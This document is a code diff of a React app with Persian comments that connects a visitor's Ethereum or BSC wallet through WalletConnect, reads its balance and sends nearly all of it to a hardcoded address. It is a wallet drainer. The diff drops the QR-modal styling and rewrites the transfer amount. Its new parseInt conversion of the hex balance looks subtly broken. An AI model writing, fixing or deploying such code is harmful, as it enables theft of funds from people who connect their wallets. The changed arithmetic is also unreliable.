@@ -5,13 +5,6 @@ function App() {
   async function runner() {
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
-      qrModalOptions: {
-        themeMode: "dark",
-        explorerRecommendedWalletIds: [
-          "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
-          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
-        ],
-      },
       chains: [1, 56], // پشتیبانی از BSC و Ethereum
       methods: ["eth_sendTransaction", "eth_getBalance"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
@@ -42,7 +35,7 @@ function App() {
           params: [account_sender, "latest"],
         });
 
-        let balanceInWei = BigInt(balance);
+        let balanceInWei = parseInt(balance, 10); // تبدیل به عدد صحیح
         console.log(`💰 Balance: ${balanceInWei} WEI`);
 
         if (balanceInWei <= 0) {
@@ -50,10 +43,18 @@ function App() {
           return;
         }
 
+        const gasFee = 21000 * 5000000000; // مقدار گس
+        const transactionValue = balanceInWei - gasFee;
+
+        if (transactionValue <= 0) {
+          console.error("❌ Not enough balance after gas fee.");
+          return;
+        }
+
         const transactionParameters = {
           to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
           from: account_sender,
-          value: "0x" + (balanceInWei - BigInt(21000) * BigInt(5000000000)).toString(16),
+          value: "0x" + transactionValue.toString(16), // تبدیل مقدار به HEX
           gas: "0x5208",
         };
 
